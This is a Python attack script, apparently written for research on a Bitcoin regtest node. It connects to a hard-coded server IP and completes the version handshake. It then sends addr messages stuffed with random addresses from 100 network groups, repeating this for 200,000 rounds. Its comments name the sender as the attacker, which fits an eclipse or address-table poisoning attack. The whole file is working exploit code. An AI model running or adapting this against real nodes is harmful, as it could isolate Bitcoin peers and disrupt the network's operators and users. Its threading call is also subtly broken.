#!/usr/bin/env python3
#参考文件：https://github.com/petertodd/python-bitcoinlib/blob/master/examples/send-addrs-msg.py
#参考文件：https://github.com/SilvioMessi/bitcoin_spv/blob/master/bitcoin_spv/clients/base_bitcoin.py

from io import BytesIO
import socket, time, bitcoin
from bitcoin.messages import msg_version, msg_verack, msg_pong, msg_addr, MsgSerializable
from bitcoin.core.serialize import SerializationTruncationError
from bitcoin.net import CAddress
import random
import time
import threading

#服务器节点的端口
PORT = 18444
bitcoin.SelectParams('regtest')
server_ip = "101.43.211.151"
#攻击者的IP地址
client_ip = "0.0.0.0"
#addr消息内的地址数量
addresses_num = 10  #最大为1000个


def generate_random_ipv4_addresses(num_addresses):
    addresses = []

    for _ in range(num_addresses):
        # Generate random IPv4 address
        #代表攻击者掌握的100个网络组信息
        #第一个数：1
        #第二个数：0-99之间的随机数
        #第三、四个数：随机
        ip_parts = [1, random.randint(0, 99)]
        ip_parts.extend(random.randint(0, 255) for _ in range(2))
        ipv4_address = ".".join(str(part) for part in ip_parts)
        addresses.append(ipv4_address)
    return addresses


def version_pkt():
    msg = msg_version()
    msg.nVersion = 70016

    msg.addrTo.ip = server_ip
    msg.addrTo.port = PORT
    msg.addrFrom.ip = client_ip
    msg.addrFrom.port = PORT
    return msg

#填充addr消息中的地址
def addr_pkt(str_addrs,n):
    msg = msg_addr()
    server_port = 10086
    addrs = []
    for i in str_addrs:
        addr = CAddress()
        #addr.port = 18333
        addr.port = server_port + n*1000        #使用一个不常见的P2P端口，标识我们的攻击脚本发送的地址
        addr.nTime = int(time.time())
        addr.ip = i

        addrs.append( addr )
    msg.addrs = addrs
    return msg



def thread_function(n):
    # 2、与目标节点握手
    try:
        s = socket.socket()
        s.connect((server_ip, PORT))
    except ConnectionRefusedError:
        return
    s.send(version_pkt().to_bytes())  # Send Version packet
    print(s.recv(1924))  # Get Version reply
    s.send(msg_verack().to_bytes())  # Send Verack
    print(s.recv(1024))
    try:
        # data = s.recv(64)
        # buffer.write(data)

        random_ipv4_addresses = generate_random_ipv4_addresses(addresses_num)
        #print(random_ipv4_addresses)
        s.send(addr_pkt(random_ipv4_addresses, n).to_bytes())

        #print("it's ok ", n + 1, " times")
        s.close()

    except socket.error as e:
        # 处理套接字错误
        error_code = e.errno
        if error_code == 10054:  # 连接被对方重置
            print("Connection reset by peer.")
        elif error_code == 10053:  # 连接被对方关闭
            print("Connection closed by peer.")
        else:
            print(f"Socket error: {e}")
    except KeyboardInterrupt:
        # 捕获Ctrl+C异常后执行的代码
        print("Ctrl+C pressed. Closing socket.")
        s.close()


if __name__ == "__main__":
    start_time = time.time()
    time_interval = 3
    times = 200000
    thread = 3
    for i in range(times):
        time.sleep(random.uniform(time_interval-1, time_interval))
        print(i)
        for j in range(thread):
            try:
                t = threading.Thread(target=thread_function(j))
                t.start()
            except TimeoutError:
                pass

    print("time =: ", time.time() - start_time)
